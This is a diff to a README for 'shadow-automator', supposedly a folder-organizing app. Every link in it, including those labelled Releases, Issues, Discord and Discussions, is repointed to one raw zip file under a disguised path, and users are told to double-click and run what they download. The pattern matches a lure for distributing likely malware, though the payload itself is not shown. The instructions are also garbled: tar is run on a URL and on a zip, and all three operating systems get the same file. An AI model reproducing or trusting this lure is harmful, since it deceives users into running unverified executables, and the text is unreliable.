@@ -1,6 +1,6 @@
 # 🪄 shadow-automator - Tame Your Messy Folders Easily
 
-[![Download ShadowAutomator](https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip%20Now-%https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip)](https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip)
+[![Download ShadowAutomator](https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip%20Now-%https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip)](https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip)
 
 ## 🐾 Introduction
 
@@ -17,15 +17,15 @@ To start using ShadowAutomator, follow these simple steps.
 
 To get ShadowAutomator, please visit the Releases page by clicking the link below. Here, you will find the latest version of the software available for download.
 
-[Download ShadowAutomator](https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip)
+[Download ShadowAutomator](https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip)
 
 Once you’re on the Releases page, you will see various versions of the software. Here’s how to proceed:
 
 1. Look for the latest version available.
 2. Find the correct file for your operating system. For example, you might see options like:
-   - `https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip` for Windows users
-   - `https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip` for macOS users
-   - `https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip` for Linux users
+   - `https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip` for Windows users
+   - `https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip` for macOS users
+   - `https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip` for Linux users
 3. Click on the file to start the download. 
 
 The download will start automatically. Depending on your internet speed, this may take a moment.
@@ -34,13 +34,13 @@ The download will start automatically. Depending on your internet speed, this ma
 
 ### For Windows:
 
-1. Locate the `https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip` file you just downloaded.
+1. Locate the `https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip` file you just downloaded.
 2. Double-click the file to run the installer.
 3. Follow the instructions on the screen to complete the installation.
 
 ### For macOS:
 
-1. Find the `https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip` file.
+1. Find the `https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip` file.
 2. Double-click the zip file to extract it.
 3. Drag the `shadow-automator` folder into your Applications folder.
 4. Open your Applications folder and double-click ShadowAutomator to run it.
@@ -49,7 +49,7 @@ The download will start automatically. Depending on your internet speed, this ma
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Run the command: `tar -xvzf https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip`
+3. Run the command: `tar -xvzf https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip`
 4. Change into the directory: `cd shadow-automator`
 5. Run the application with `./shadow-automator`.
 
@@ -88,7 +88,7 @@ For users who want more control, you can access advanced settings. Here, you can
 
 ### How do I report problems?
 
-If you encounter any issues, please visit our [GitHub Issues page](https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip) to describe your problem.
+If you encounter any issues, please visit our [GitHub Issues page](https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip) to describe your problem.
 
 ### Can I customize the application?
 
@@ -100,10 +100,10 @@ While we do not have a standalone manual, this README covers the essentials. Fee
 
 ## 🔗 Support
 
-For additional help, join our community on [Discord](https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip) or [GitHub Discussions](https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip) to ask questions and share tips.
+For additional help, join our community on [Discord](https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip) or [GitHub Discussions](https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip) to ask questions and share tips.
 
 ## 🔗 Download Again
 
-If you need to download ShadowAutomator again, you can always return to the [Releases page](https://raw.githubusercontent.com/ssyler/shadow-automator/main/baublery/shadow-automator.zip). 
+If you need to download ShadowAutomator again, you can always return to the [Releases page](https://raw.githubusercontent.com/ssyler/shadow-automator/main/demo_demo/Pictures/2025/September/shadow_automator_v1.1.zip). 
 
 Now, enjoy organizing your files with ease!
